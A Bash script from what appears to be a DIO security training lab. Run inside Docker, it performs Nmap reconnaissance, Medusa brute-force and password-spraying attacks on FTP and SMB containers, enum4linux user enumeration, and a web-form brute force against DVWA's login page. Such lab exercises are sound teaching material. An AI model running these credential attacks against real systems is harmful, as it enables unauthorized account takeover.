#!/bin/bash
# Script de execução dos ataques de brute force - Lab DIO
# Requer: docker compose up -d (containers em execução)

set -e

CONTAINER="${ATTACKER_CONTAINER:-attacker}"
WORDLIST_DIR="${WORDLIST_DIR:-/wordlists}"

echo "=== 1. Reconhecimento (Nmap) ==="
docker exec "$CONTAINER" nmap -sV -p 21,80,139,445 ftp smb dvwa

echo ""
echo "=== 2. FTP - Brute Force (Medusa) ==="
docker exec "$CONTAINER" medusa -h ftp -M ftp -U "$WORDLIST_DIR/users.txt" -P "$WORDLIST_DIR/passwords.txt"

echo ""
echo "=== 3. SMB - Enumeração de usuários (Enum4linux) ==="
docker exec "$CONTAINER" enum4linux -U smb 2>/dev/null || true

echo ""
echo "=== 4. SMB - Password Spraying (Medusa) ==="
docker exec "$CONTAINER" medusa -h smb -M smbnt -U "$WORDLIST_DIR/users.txt" -P "$WORDLIST_DIR/passwords.txt"

echo ""
echo "=== 5. DVWA - Brute Force em formulário web (Medusa) ==="
echo "Nota: Medusa tem limitações com DVWA (CSRF, HTTP 302). Consulte docs/dvwa-setup-e-hydra.md"
docker exec "$CONTAINER" medusa -h dvwa -M web-form \
  -m FORM:"login.php" \
  -m FORM-DATA:"post?username=&password=&Login=Login" \
  -m DENY-SIGNAL:"Login failed" \
  -u admin \
  -P "$WORDLIST_DIR/passwords.txt"

echo ""
echo "=== 6. DVWA - Brute Force com Hydra (totalmente automatizado) ==="
if [ -f "$(dirname "$0")/dvwa-hydra-attack.sh" ]; then
  "$(dirname "$0")/dvwa-hydra-attack.sh"
else
  echo "Script dvwa-hydra-attack.sh não encontrado. Execute manualmente: ./scripts/dvwa-hydra-attack.sh"
fi

echo ""
echo "=== Ataques concluídos ==="
